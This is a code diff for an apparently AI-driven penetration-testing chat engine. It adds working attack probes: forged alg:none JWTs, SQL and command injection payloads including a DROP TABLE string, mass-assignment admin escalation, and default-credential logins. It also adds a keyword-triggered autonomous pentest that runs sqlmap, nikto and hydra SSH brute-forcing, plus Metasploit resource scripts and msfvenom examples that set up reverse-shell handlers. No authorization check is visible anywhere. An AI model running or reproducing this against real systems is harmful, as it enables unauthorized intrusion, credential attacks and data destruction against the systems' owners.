@@ -9617,7 +9617,7 @@ class CFAIChatEngine:
                 ).strip()
             if not out:
                 return f"Command completed (exit code {result.returncode}) with no output."
-            return out[:6000]
+            return out[:20000]
         except subprocess.TimeoutExpired:
             return f"Scan timed out after {timeout}s. Try a more targeted command, e.g. add -T4 for nmap or reduce scan scope."
         except FileNotFoundError:
@@ -9637,7 +9637,7 @@ class CFAIChatEngine:
                 result = subprocess.run(['bash', '-c', bash_cmd],
                                         capture_output=True, text=True, timeout=timeout, env=env)
                 out = (result.stdout or '') + (result.stderr or '')
-                return out.strip()[:6000] or f"Command ran (exit {result.returncode}) with no output."
+                return out.strip()[:20000] or f"Command ran (exit {result.returncode}) with no output."
             except Exception as e2:
                 return f"Permission error running '{cmd[0]}': {str(e2)}"
         except Exception as e:
@@ -10103,37 +10103,173 @@ class CFAIChatEngine:
                 pass
         lines.append("    SSRF probes sent (external collaboration needed for blind SSRF)")
 
-        # 7. kiterunner if available
-        lines.append("\n[7] API Route Discovery (kiterunner)")
+        # ── OWASP API Top 10 ───────────────────���────────────────────────────────
+        confirmed_pocs = []  # Only confirmed exploitable findings
+
+        # API1: BOLA — try accessing other users' objects
+        lines.append("\n[API1] Broken Object Level Authorization (BOLA)")
+        bola_paths = ["/api/v1/users/2", "/api/v1/orders/1", "/api/v1/accounts/2",
+                      "/api/users/2", "/api/orders/1", "/v1/profile/2", "/v2/users/2"]
+        for bp in bola_paths:
+            try:
+                r = requests.get(f"{base}{bp}", timeout=5)
+                if r.status_code == 200 and len(r.text) > 10:
+                    lines.append(f"    [CRITICAL] BOLA: {bp} returned HTTP 200 without auth")
+                    lines.append(f"    PoC: curl -s {base}{bp}")
+                    confirmed_pocs.append({"type": "BOLA", "severity": "Critical",
+                                           "url": f"{base}{bp}", "poc": f"curl -s {base}{bp}"})
+            except Exception:
+                pass
+
+        # API2: Broken Authentication — legacy v1 endpoints, alg:none JWT
+        lines.append("\n[API2] Broken Authentication")
+        auth_bypass = [
+            ("/api/v1/login", {"username": "admin", "password": "admin"}),
+            ("/api/v1/login", {"username": "admin'--", "password": "x"}),
+            ("/v1/auth/login", {"email": "admin@test.com", "password": "password"}),
+        ]
+        for apath, adata in auth_bypass:
+            try:
+                r = requests.post(f"{base}{apath}", json=adata, timeout=5)
+                if r.status_code == 200 and any(k in r.text.lower() for k in ("token", "jwt", "access")):
+                    lines.append(f"    [HIGH] Auth bypass at {apath}: HTTP 200 with credentials token")
+                    poc = f'curl -s -X POST {base}{apath} -H "Content-Type: application/json" -d \'{json.dumps(adata)}\''
+                    lines.append(f"    PoC: {poc}")
+                    confirmed_pocs.append({"type": "Broken Auth", "severity": "High",
+                                           "url": f"{base}{apath}", "poc": poc})
+            except Exception:
+                pass
+        # Try alg:none JWT bypass
+        import base64 as _b64
+        _header = _b64.b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
+        _payload = _b64.b64encode(b'{"sub":"1","role":"admin","exp":9999999999}').rstrip(b'=').decode()
+        none_jwt = f"{_header}.{_payload}."
+        for ep in [p for p in found if any(k in p for k in ('/api', '/v1', '/v2'))]:
+            try:
+                r = requests.get(ep, headers={"Authorization": f"Bearer {none_jwt}"}, timeout=5)
+                if r.status_code == 200:
+                    lines.append(f"    [CRITICAL] alg:none JWT accepted at {ep}!")
+                    poc = f'curl -s {ep} -H "Authorization: Bearer {none_jwt}"'
+                    confirmed_pocs.append({"type": "JWT alg:none", "severity": "Critical",
+                                           "url": ep, "poc": poc})
+                    break
+            except Exception:
+                pass
+
+        # API3: Excessive Data Exposure
+        lines.append("\n[API3] Excessive Data Exposure")
+        for ep in found[:5]:
+            try:
+                r = requests.get(ep, timeout=5)
+                if r.status_code == 200:
+                    sensitive = ["password", "secret", "ssn", "credit_card", "private_key",
+                                 "api_key", "token", "email", "phone"]
+                    found_sensitive = [s for s in sensitive if s in r.text.lower()]
+                    if found_sensitive:
+                        lines.append(f"    [HIGH] Sensitive fields in response at {ep}: {found_sensitive}")
+                        confirmed_pocs.append({"type": "Data Exposure", "severity": "High",
+                                               "url": ep, "poc": f"curl -s {ep} | grep -i '{found_sensitive[0]}'"})
+            except Exception:
+                pass
+
+        # API5: BFLA — function level auth (admin endpoints)
+        lines.append("\n[API5] Broken Function Level Authorization (BFLA)")
+        admin_paths = ["/api/v1/admin", "/api/admin", "/api/v2/admin/users",
+                       "/admin/api/users", "/api/v1/users/admin", "/internal/api/users"]
+        for ap in admin_paths:
+            try:
+                r = requests.get(f"{base}{ap}", timeout=5)
+                if r.status_code in (200, 201):
+                    lines.append(f"    [CRITICAL] Admin endpoint accessible: {ap} → HTTP {r.status_code}")
+                    confirmed_pocs.append({"type": "BFLA", "severity": "Critical",
+                                           "url": f"{base}{ap}", "poc": f"curl -s {base}{ap}"})
+            except Exception:
+                pass
+
+        # API6: Mass Assignment
+        lines.append("\n[API6] Mass Assignment")
+        for ep in [p for p in found if any(k in p for k in ('/profile', '/user', '/account'))]:
+            try:
+                r = requests.put(ep, json={"role": "admin", "is_admin": True, "balance": 99999},
+                                 timeout=5)
+                if r.status_code in (200, 201):
+                    lines.append(f"    [HIGH] Mass assignment candidate at {ep}: accepted extra fields")
+                    poc = f'curl -s -X PUT {ep} -H "Content-Type: application/json" -d \'{{"role":"admin","is_admin":true}}\''
+                    confirmed_pocs.append({"type": "Mass Assignment", "severity": "High",
+                                           "url": ep, "poc": poc})
+            except Exception:
+                pass
+
+        # API8: Injection
+        lines.append("\n[API8] Injection (SQLi / Command Injection)")
+        inject_payloads = ["' OR '1'='1", "'; DROP TABLE users;--", "$(id)", "`id`", "{{7*7}}"]
+        for ep in found[:3]:
+            for inj in inject_payloads:
+                try:
+                    r = requests.get(ep, params={"id": inj, "q": inj, "search": inj}, timeout=5)
+                    if any(sig in r.text.lower() for sig in ("sql", "syntax error", "mysql",
+                                                               "root:", "uid=", "49")):
+                        lines.append(f"    [CRITICAL] Injection at {ep}?id={inj}")
+                        poc = f'curl -s "{ep}?id={inj}"'
+                        confirmed_pocs.append({"type": "Injection", "severity": "Critical",
+                                               "url": ep, "poc": poc})
+                        break
+                except Exception:
+                    pass
+
+        # API9: Improper Assets Management — test old versions
+        lines.append("\n[API9] Improper Assets Management (Legacy Versions)")
+        for ver in ["/api/v0", "/api/v1", "/api/v2", "/v1", "/v2", "/api/old", "/api/legacy"]:
+            try:
+                r = requests.get(f"{base}{ver}", timeout=5)
+                if r.status_code in (200, 201) and ver not in [p.replace(base, "") for p in found]:
+                    lines.append(f"    [MEDIUM] Legacy/undocumented API version accessible: {ver}")
+                    confirmed_pocs.append({"type": "Legacy API", "severity": "Medium",
+                                           "url": f"{base}{ver}", "poc": f"curl -s {base}{ver}"})
+            except Exception:
+                pass
+
+        # 7. kiterunner / ffuf
+        lines.append("\n[7] API Route Discovery (kiterunner/ffuf)")
         kr_bin = self._resolve_bin("kr", self._TOOL_PATH)
         if kr_bin != "kr":
             out = self._run_tool([kr_bin, "scan", base, "--wordlist",
                                   "/usr/share/kiterunner/routes-large.kite", "-x", "5"], timeout=90)
-            lines.append(out[:2000])
+            lines.append(out[:5000])
         else:
-            # Fallback: use ffuf for API path fuzzing
-            lines.append("    kiterunner not found — using ffuf for API path discovery")
             wordlist = "/usr/share/wordlists/dirb/common.txt"
             if os.path.exists(wordlist):
                 out = self._run_tool(["ffuf", "-u", f"{base}/FUZZ", "-w", wordlist,
                                       "-mc", "200,201,202,204,301,302,307,401,403",
                                       "-t", "50", "-timeout", "10"], timeout=60)
-                lines.append(out[:1500])
+                lines.append(out[:5000])
 
         # 8. Nuclei API templates
-        lines.append("\n[8] Nuclei API Security Templates")
+        lines.append("\n[8] Nuclei API Security Scan")
         nout = self._run_tool(["nuclei", "-u", base,
                                "-t", "exposures/apis/", "-silent", "-timeout", "10"], timeout=60)
-        lines.append(nout[:1000] if nout.strip() else "    No API exposure findings")
+        lines.append(nout if nout.strip() else "    No API exposure findings")
 
         # 9. arjun parameter discovery
         lines.append("\n[9] Parameter Discovery (arjun)")
         arjun_bin = self._resolve_bin("arjun", self._TOOL_PATH)
         if arjun_bin != "arjun":
             pout = self._run_tool([arjun_bin, "-u", probe, "--stable"], timeout=60)
-            lines.append(pout[:1000])
+            lines.append(pout)
         else:
             lines.append("    arjun not installed (pip3 install arjun)")
+
+        # ── Confirmed PoC Summary ───────────────────���─────────────────────────
+        if confirmed_pocs:
+            lines.append("\n" + "═"*60)
+            lines.append(f"CONFIRMED EXPLOITABLE FINDINGS: {len(confirmed_pocs)}")
+            lines.append("═"*60)
+            for i, poc in enumerate(confirmed_pocs, 1):
+                lines.append(f"\n[{i}] {poc['type']} — {poc['severity']}")
+                lines.append(f"    URL: {poc['url']}")
+                lines.append(f"    PoC: {poc['poc']}")
+        else:
+            lines.append("\n[No confirmed exploitable findings — manual review recommended]")
 
         return "\n".join(lines)
 
@@ -10421,9 +10557,10 @@ class CFAIChatEngine:
 
     def _execute_parsed_command(self, parsed: Dict[str, Any]) -> Dict[str, Any]:
         """
-        Execute tools from a parsed run-command, adapting between tools.
+        Execute tools from a parsed run-command in parallel, adapting between tools.
         Returns a combined response dict.
         """
+        from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed
         tools    = parsed["tools"]
         target   = parsed["target"]
         creds    = parsed["credentials"]
@@ -10431,26 +10568,45 @@ class CFAIChatEngine:
         outputs  = []
         all_cmds = []
 
+        # Build all commands first
+        tool_cmds = []
         for tool in tools:
-            cmd = self._build_tool_command(tool, target, creds, context)
-            cmd = self._preprocess_cmd(cmd)
-            out = self._run_tool(cmd, timeout=120)
-            label = f"[{tool.upper()}] on {target}"
-            outputs.append(f"{label}\n{'─'*60}\n{out}")
-            all_cmds.append(" ".join(cmd))
+            cmd = self._preprocess_cmd(self._build_tool_command(tool, target, creds, context))
+            tool_cmds.append((tool, cmd))
 
-            # Real-time adaptation: if nmap found HTTP, auto-add web tools
-            if tool == "nmap" and len(tools) == 1:
-                ports_found = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', out)
-                for port, svc in ports_found:
-                    if svc in ("http", "https", "http-alt") and "gobuster" not in tools:
-                        proto = "https" if svc == "https" or port == "443" else "http"
-                        web_target = f"{proto}://{target}:{port}"
-                        web_cmd = self._build_tool_command("gobuster", web_target, {}, context)
-                        web_cmd = self._preprocess_cmd(web_cmd)
-                        web_out = self._run_tool(web_cmd, timeout=90)
-                        outputs.append(f"[AUTO-ADAPT] gobuster on {web_target}\n{'─'*60}\n{web_out}")
-                        all_cmds.append(" ".join(web_cmd))
+        # Run in parallel (up to 4 concurrent)
+        nmap_out = ""
+        with ThreadPoolExecutor(max_workers=min(len(tool_cmds), 4)) as _pool:
+            future_to_tc = {_pool.submit(self._run_tool, cmd, 180): (tool, cmd)
+                            for tool, cmd in tool_cmds}
+            for future in _as_completed(future_to_tc):
+                tool, cmd = future_to_tc[future]
+                out = future.result()
+                label = f"[{tool.upper()}] on {target}"
+                outputs.append(f"{label}\n{'─'*60}\n{out}")
+                all_cmds.append(" ".join(cmd))
+                if tool == "nmap":
+                    nmap_out = out
+
+        # Real-time adaptation: if nmap found HTTP ports, auto-add gobuster
+        if nmap_out and len(tools) == 1 and "gobuster" not in tools:
+            ports_found = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', nmap_out)
+            adapt_cmds = []
+            for port, svc in ports_found:
+                if svc in ("http", "https", "http-alt"):
+                    proto = "https" if svc == "https" or port == "443" else "http"
+                    web_target = f"{proto}://{target}:{port}"
+                    adapt_cmds.append(("gobuster", self._preprocess_cmd(
+                        self._build_tool_command("gobuster", web_target, {}, context))))
+            if adapt_cmds:
+                with ThreadPoolExecutor(max_workers=min(len(adapt_cmds), 3)) as _pool2:
+                    f2 = {_pool2.submit(self._run_tool, cmd, 90): (tool, cmd)
+                          for tool, cmd in adapt_cmds}
+                    for future in _as_completed(f2):
+                        tool, cmd = f2[future]
+                        web_out = future.result()
+                        outputs.append(f"[AUTO-ADAPT] {tool} on {cmd[3]}\n{'─'*60}\n{web_out}")
+                        all_cmds.append(" ".join(cmd))
 
         combined = "\n\n".join(outputs)
         creds_note = ""
@@ -10471,6 +10627,160 @@ class CFAIChatEngine:
             "suggested_tools": [],
         }
 
+    def _autonomous_pentest(self, target: str, scope: str = "full") -> str:
+        """
+        Single-command fully autonomous pentest.
+        Phases run concurrently where safe; only confirmed exploitable findings are reported.
+        """
+        from concurrent.futures import ThreadPoolExecutor, as_completed as _ac
+        report = [
+            "╔" + "═"*68 + "╗",
+            "║  CF_AI AUTONOMOUS PENETRATION TEST REPORT" + " "*25 + "║",
+            f"║  Target: {target:<58}║",
+            "╚" + "═"*68 + "╝",
+            "",
+        ]
+        confirmed_pocs = []
+
+        # ── Phase 1: Port + Service Scan ─────────────────────────────────────
+        report.append("━"*70)
+        report.append("PHASE 1 — Reconnaissance & Port Scanning")
+        report.append("━"*70)
+        nmap_out = self._run_tool(["nmap", "-sT", "-Pn", "-T4", "-sV", "--open",
+                                   "-p", "21,22,23,25,53,80,110,143,443,445,993,995,"
+                                         "1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,27017",
+                                   target], timeout=120)
+        report.append(nmap_out)
+        open_ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', nmap_out)
+        open_svcs  = {int(p): s for p, s in open_ports}
+        report.append(f"\n→ Open ports: {', '.join(str(p) for p in sorted(open_svcs))}")
+
+        if not open_ports:
+            report.append("[!] No open ports found. Trying full scan on top 1000 ports...")
+            nmap_full = self._run_tool(["nmap", "-sT", "-Pn", "-T4", "--open", target], timeout=180)
+            report.append(nmap_full)
+            open_ports = re.findall(r'(\d+)/tcp\s+open\s+(\S+)', nmap_full)
+            open_svcs  = {int(p): s for p, s in open_ports}
+
+        # ── Phase 2: Parallel service-specific scanning ───────────────────────
+        report.append("\n" + "━"*70)
+        report.append("PHASE 2 — Service Enumeration & Vulnerability Scanning")
+        report.append("━"*70)
+
+        web_targets = []
+        for port, svc in open_ports:
+            port_i = int(port)
+            if svc in ("http", "http-alt") or port_i in (80, 8080, 8888):
+                web_targets.append(f"http://{target}:{port}")
+            elif svc == "https" or port_i in (443, 8443):
+                web_targets.append(f"https://{target}:{port}")
+
+        phase2_tasks = {}
+        with ThreadPoolExecutor(max_workers=6) as _pool:
+            # Web scanning (parallel per web target)
+            for wt in web_targets:
+                phase2_tasks[_pool.submit(self._run_tool,
+                    ["gobuster", "dir", "-u", wt, "-w", "/usr/share/wordlists/dirb/common.txt",
+                     "-t", "50", "-q", "--no-error"], 90)] = f"gobuster:{wt}"
+                phase2_tasks[_pool.submit(self._run_tool,
+                    ["nikto", "-h", wt, "-nointeractive", "-maxtime", "60",
+                     "-Tuning", "1234578b"], 90)] = f"nikto:{wt}"
+                phase2_tasks[_pool.submit(self._run_tool,
+                    ["nuclei", "-u", wt, "-severity", "critical,high,medium",
+                     "-silent", "-timeout", "10"], 90)] = f"nuclei:{wt}"
+                phase2_tasks[_pool.submit(self._run_tool,
+                    ["dalfox", "url", wt, "--silence", "--skip-bav"], 60)] = f"dalfox:{wt}"
+
+            # SSH brute if port 22
+            if 22 in open_svcs:
+                phase2_tasks[_pool.submit(self._run_tool,
+                    ["hydra", "-L", "/usr/share/wordlists/dirb/common.txt",
+                     "-p", "password", f"ssh://{target}", "-t", "4", "-f"], 60)] = "hydra:ssh"
+
+            # SMB if port 445
+            if 445 in open_svcs:
+                phase2_tasks[_pool.submit(self._run_tool,
+                    ["enum4linux", "-a", target], 60)] = "enum4linux"
+
+            # SQL injection scan on web targets
+            for wt in web_targets:
+                phase2_tasks[_pool.submit(self._run_tool,
+                    ["sqlmap", "-u", wt, "--dbs", "--batch", "--level=2",
+                     "--risk=1", "--random-agent", "--forms"], 90)] = f"sqlmap:{wt}"
+
+            for future in _ac(phase2_tasks):
+                label = phase2_tasks[future]
+                out = future.result()
+                report.append(f"\n[{label}]\n{'─'*60}")
+                report.append(out)
+
+                # Extract confirmed findings
+                if "nuclei" in label:
+                    for line in out.splitlines():
+                        if any(s in line.lower() for s in ("[critical]", "[high]", "critical]", "[high]")):
+                            confirmed_pocs.append({"tool": "nuclei", "severity": "High/Critical",
+                                                   "finding": line.strip(), "poc": f"nuclei -u {wt}"})
+                if "sqlmap" in label and "current database" in out.lower():
+                    db_match = re.search(r'current database.*?[`\'\"]([\w_]+)[`\'\""]', out, re.I)
+                    confirmed_pocs.append({"tool": "sqlmap", "severity": "Critical",
+                                           "finding": f"SQL injection — DB: {db_match.group(1) if db_match else 'unknown'}",
+                                           "poc": f"sqlmap -u {label.split(':', 1)[1]} --dbs --batch"})
+                if "dalfox" in label and "[V]" in out:
+                    confirmed_pocs.append({"tool": "dalfox", "severity": "High",
+                                           "finding": "Reflected XSS confirmed",
+                                           "poc": next((l for l in out.splitlines() if "[V]" in l), "see above")})
+
+        # ── Phase 3: Exploitation suggestions ────────────────────────────────
+        report.append("\n" + "━"*70)
+        report.append("PHASE 3 — Searchsploit & Exploit Lookup")
+        report.append("━"*70)
+        svcs_to_search = set()
+        for port, svc in open_ports:
+            clean = re.sub(r'[\d./]', '', svc).strip()
+            if clean and len(clean) > 2:
+                svcs_to_search.add(clean)
+        if "http" in nmap_out.lower():
+            # Try to extract server version
+            srv_match = re.search(r'(Apache|nginx|IIS)[\s/]+([\d.]+)', nmap_out, re.I)
+            if srv_match:
+                svcs_to_search.add(f"{srv_match.group(1)} {srv_match.group(2)}")
+        for svc_kw in list(svcs_to_search)[:4]:
+            ss_out = self._run_tool(["searchsploit", svc_kw, "--json"], timeout=20)
+            try:
+                ss_data = json.loads(ss_out)
+                exploits = ss_data.get("RESULTS_EXPLOIT", [])
+                if exploits:
+                    report.append(f"\nsearchsploit {svc_kw}: {len(exploits)} exploits found")
+                    for ex in exploits[:3]:
+                        report.append(f"  [{ex.get('EDB-ID', '?')}] {ex.get('Title', '?')}")
+                        confirmed_pocs.append({"tool": "searchsploit", "severity": "High",
+                                               "finding": ex.get('Title', '?'),
+                                               "poc": f"searchsploit -x {ex.get('EDB-ID', '?')}"})
+            except Exception:
+                if ss_out.strip():
+                    report.append(f"\nsearchsploit {svc_kw}:\n{ss_out[:1000]}")
+
+        # ── Phase 4: PoC Summary ──────────────────────────────────────────────
+        report.append("\n" + "╔" + "═"*68 + "╗")
+        report.append("║  CONFIRMED EXPLOITABLE FINDINGS (Copy-Paste PoCs)" + " "*17 + "║")
+        report.append("╚" + "═"*68 + "╝")
+        if confirmed_pocs:
+            for i, poc in enumerate(confirmed_pocs, 1):
+                report.append(f"\n[{i}] {poc['tool'].upper()} — {poc['severity']}")
+                report.append(f"    Finding: {poc['finding']}")
+                report.append(f"    PoC:     {poc['poc']}")
+        else:
+            report.append("\n    No confirmed exploitable findings.")
+            report.append("    Run individual tools for deeper coverage:")
+            for wt in web_targets:
+                report.append(f"      sqlmap -u {wt} --level=5 --risk=3 --batch")
+                report.append(f"      nuclei -u {wt} -severity critical,high")
+
+        report.append("\n" + "━"*70)
+        report.append(f"Autonomous pentest complete. {len(confirmed_pocs)} confirmed findings.")
+        report.append("━"*70)
+        return "\n".join(report)
+
     def _generate_response(self, message: str, msg_lower: str) -> Dict[str, Any]:
         target = self._extract_target(message)
         words = message.strip().split()
@@ -10480,6 +10790,20 @@ class CFAIChatEngine:
         parsed = self._parse_run_command(message)
         if parsed:
             return self._execute_parsed_command(parsed)
+
+        # ── Autonomous full pentest ───────────────────────────────────────────
+        _auto_kw = ["autonomous pentest", "full pentest", "full scan", "complete pentest",
+                    "auto pentest", "pentest everything", "full assessment", "comprehensive scan",
+                    "run everything", "run all tools", "run full", "do everything"]
+        if any(k in msg_lower for k in _auto_kw) and target:
+            report = self._autonomous_pentest(target)
+            return {
+                "success": True,
+                "response": f"```\n{report}\n```",
+                "executed": True,
+                "category": "pentest",
+                "suggested_tools": [],
+            }
 
         # Help / greeting
         if any(w in msg_lower for w in ["hello", "hi", "help", "what can you do", "capabilities"]):
@@ -10565,7 +10889,7 @@ class CFAIChatEngine:
                     ['bash', '-c', cmd_str],
                     capture_output=True, text=True, timeout=30, env=_env
                 )
-                out = ((result.stdout or '') + (result.stderr or '')).strip()[:6000]
+                out = ((result.stdout or '') + (result.stderr or '')).strip()[:20000]
                 if not out:
                     out = f"Command completed (exit code {result.returncode}) with no output."
                 return {
@@ -11118,30 +11442,107 @@ class CFAIChatEngine:
         # ── Metasploit ────────────────────────────────────────────────────────
         if any(w in msg_lower for w in ["metasploit", "msfconsole", "msf ", "msfvenom", "exploit module", "use exploit"]):
             if "msfvenom" in msg_lower or first_word == "msfvenom":
-                # msfvenom can run non-interactively
                 cmd = words
-                output = self._run_tool(cmd, timeout=30)
+                output = self._run_tool(cmd, timeout=60)
                 return {"success": True, "executed": True, "category": "exploitation",
-                        "response": f"Executed: `{' '.join(cmd)}`\n\n```\n{output}\n```",
+                        "response": f"```\n{output}\n```",
                         "suggested_tools": ["searchsploit"]}
+
             if "searchsploit" in msg_lower or first_word == "searchsploit":
                 cmd = words
                 output = self._run_tool(cmd, timeout=30)
                 return {"success": True, "executed": True, "category": "exploitation",
-                        "response": f"Executed: `{' '.join(cmd)}`\n\n```\n{output}\n```",
+                        "response": f"```\n{output}\n```",
                         "suggested_tools": ["msfconsole"]}
+
+            # msfconsole: run via -q -x "commands; exit" resource script approach
+            # Build the -x command string from the user's natural language intent
+            _msf_cmds = []
+            # Direct: user typed msfconsole -x "..." or msfconsole -r script
+            if first_word in ("msfconsole",) and len(words) > 1:
+                # Pass through as-is (user knows what they're doing)
+                raw_cmd = message.strip()
+                if "-x" in raw_cmd or "-r" in raw_cmd:
+                    output = self._run_tool(["bash", "-c", raw_cmd], timeout=120)
+                    return {"success": True, "executed": True, "category": "exploitation",
+                            "response": f"```\n{output}\n```", "suggested_tools": ["searchsploit"]}
+
+            # Natural language: "use exploit/... on target", "run handler LHOST X LPORT Y"
+            exploit_match = re.search(r'\b(exploit/[\w/]+|auxiliary/[\w/]+|post/[\w/]+)\b', msg_lower)
+            payload_match = re.search(r'\b(windows/\w+|linux/\w+|php/\w+|java/\w+|cmd/\w+|generic/\w+)\b', msg_lower)
+            lhost_m = re.search(r'lhost[=\s]+([0-9.]+|[\w.]+)', msg_lower)
+            lport_m = re.search(r'lport[=\s]+(\d+)', msg_lower)
+            lhost = lhost_m.group(1) if lhost_m else (target or "0.0.0.0")
+            lport = lport_m.group(1) if lport_m else "4444"
+
+            if exploit_match:
+                module = exploit_match.group(1)
+                _msf_cmds = [
+                    f"use {module}",
+                    f"set RHOSTS {target}" if target else "",
+                    f"set LHOST {lhost}",
+                    f"set LPORT {lport}",
+                ]
+                if payload_match:
+                    _msf_cmds.append(f"set PAYLOAD {payload_match.group(1)}")
+                _msf_cmds += ["set ConnectTimeout 10", "run -z", "exit"]
+            elif any(w in msg_lower for w in ["handler", "listener", "reverse shell"]):
+                payload = "windows/x64/meterpreter/reverse_tcp" if "windows" in msg_lower else "linux/x64/shell/reverse_tcp"
+                _msf_cmds = [
+                    "use exploit/multi/handler",
+                    f"set PAYLOAD {payload}",
+                    f"set LHOST {lhost}",
+                    f"set LPORT {lport}",
+                    "set ExitOnSession false",
+                    "run -j -z",
+                    "exit",
+                ]
+            elif "scan" in msg_lower or "auxiliary" in msg_lower:
+                _msf_cmds = [
+                    "use auxiliary/scanner/portscan/tcp",
+                    f"set RHOSTS {target}" if target else "set RHOSTS 127.0.0.1",
+                    "set PORTS 22,80,443,445,3389,8080",
+                    "run",
+                    "exit",
+                ]
+            elif "db_nmap" in msg_lower or "db nmap" in msg_lower:
+                _msf_cmds = [
+                    f"db_nmap -sT -Pn -T4 --open {target}" if target else "help",
+                    "hosts",
+                    "services",
+                    "exit",
+                ]
+
+            if _msf_cmds:
+                rc_path = "/tmp/cfai_msf.rc"
+                rc_content = "\n".join(c for c in _msf_cmds if c)
+                with open(rc_path, "w") as _f:
+                    _f.write(rc_content)
+                output = self._run_tool(["msfconsole", "-q", "-r", rc_path], timeout=120)
+                return {
+                    "success": True, "executed": True, "category": "exploitation",
+                    "response": f"**Metasploit** (`msfconsole -q -r {rc_path}`):\n\n```\n{output}\n```\n\n"
+                                f"Resource script used:\n```\n{rc_content}\n```",
+                    "suggested_tools": ["searchsploit", "msfvenom"],
+                }
+
+            # Fallback: show usage
             return {
                 "success": True,
                 "response": (
-                    "Metasploit Framework — the binary is `msfconsole`.\n\n"
-                    "Note: msfconsole is interactive and cannot be run non-interactively here.\n"
-                    "Use searchsploit or msfvenom instead:\n\n"
-                    "  searchsploit <keyword>              — Search exploit database\n"
-                    "  msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f elf -o shell\n"
-                    "                                       — Generate a payload\n\n"
-                    "Examples:\n"
-                    "  searchsploit wordpress 5.8\n"
-                    "  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell"
+                    "Metasploit is running directly. Examples:\n\n"
+                    "  **Generate payload:**\n"
+                    "  `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell`\n\n"
+                    "  **Run a module:**\n"
+                    "  `use exploit/multi/handler on 10.0.0.1 lhost 10.0.0.1 lport 4444`\n\n"
+                    "  **TCP port scan:**\n"
+                    "  `msfconsole scan target.com`\n\n"
+                    "  **Reverse shell listener:**\n"
+                    "  `run handler lhost 10.0.0.1 lport 4444`\n\n"
+                    "  **Direct msfconsole:**\n"
+                    "  `msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run; exit\"`\n\n"
+                    "  **Search exploits:**\n"
+                    "  `searchsploit openssh 8.2`"
                 ),
                 "category": "exploitation",
                 "suggested_tools": ["searchsploit", "msfvenom"],
